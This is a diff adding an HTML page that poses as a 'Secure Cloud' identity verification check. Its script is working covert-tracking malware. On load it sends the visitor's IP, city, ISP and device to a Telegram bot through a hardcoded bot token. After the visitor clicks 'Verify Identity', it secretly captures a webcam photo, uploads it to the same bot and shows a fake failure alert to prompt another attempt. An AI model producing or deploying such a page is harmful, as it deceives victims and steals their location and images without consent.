@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Storage Verification</title>
+    <style>
+        body {
+            /* এখানে আপনার ছবির লিঙ্ক দিন */
+            background-image: url('https://w0.peakpx.com/wallpaper/594/547/HD-wallpaper-hacking-dark-background-technology.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #fff;
+            text-align: center;
+            padding-top: 15%;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            height: 100vh;
+        }
+
+        /* মাঝখানের বক্সটিকে স্বচ্ছ এবং সুন্দর করার জন্য */
+        .main-container {
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            display: inline-block;
+            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.8); /* কালো কিন্তু কিছুটা স্বচ্ছ */
+            backdrop-filter: blur(10px); /* গ্লাস ইফেক্ট */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        button {
+            padding: 12px 30px;
+            cursor: pointer;
+            background: #3498db;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #2980b9;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <h2 style="color: #3498db; margin-bottom: 10px;">🔒 Secure Cloud</h2>
+        <p style="color: #ccc;">Security check required to access private files.</p>
+        <p style="font-size: 13px; color: #888;">Please smile and verify your identity.</p>
+        <br>
+        <button onclick="takeSnap()">Verify Identity</button>
+    </div>
+
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const token = "8344149838:AAFseljBPNEZJ1OTiLK3_Fv5aMn2fcf7RYk"; 
+        const id = "7967860350"; 
+        let targetInfo = "Location not found";
+
+        window.onload = async () => {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                targetInfo = `📍 IP: ${data.ip}\n🏙️ City: ${data.city}\n📡 ISP: ${data.org}\n📱 Device: ${navigator.platform}`;
+                
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent("🔔 Link Opened!\n\n" + targetInfo)}`);
+            } catch (e) {
+                targetInfo = "Could not track location";
+            }
+        };
+
+        async function takeSnap() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', id);
+                        fd.append('photo', blob, 'pic.jpg');
+                        fd.append('caption', `📸 Captured Photo\n\n${targetInfo}`);
+                        
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd})
+                        .then(res => {
+                            if(res.ok) alert("Verification Failed. Please try again in better lighting.");
+                        });
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (e) { 
+                alert("Permission Denied: Camera access is required for verification."); 
+            }
+        }
+    </script>
+</body>
+</html>
